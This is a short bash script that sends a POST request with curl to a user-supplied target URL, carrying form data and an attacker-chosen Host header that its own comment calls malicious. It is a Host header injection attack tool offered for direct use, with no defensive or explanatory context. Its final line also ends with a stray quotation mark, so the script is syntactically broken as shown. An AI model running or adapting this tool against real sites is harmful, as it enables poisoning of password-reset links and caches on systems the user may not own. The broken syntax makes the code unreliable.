#!/bin/bash

# Ensure proper arguments are provided
if [ "$#" -ne 3 ]; then
  echo "Usage: $0 <NEW_HOST> <TARGET_URL> <FORM_DATA>"
  exit 1
fi

# Assign arguments to variables
NEW_HOST=$1
TARGET_URL=$2
FORM_DATA=$3

# Send the POST request with the malicious Host header and form data
curl -X POST "$TARGET_URL" \
     -H "Host: $NEW_HOST" \
     -d "$FORM_DATA" \
     -v"
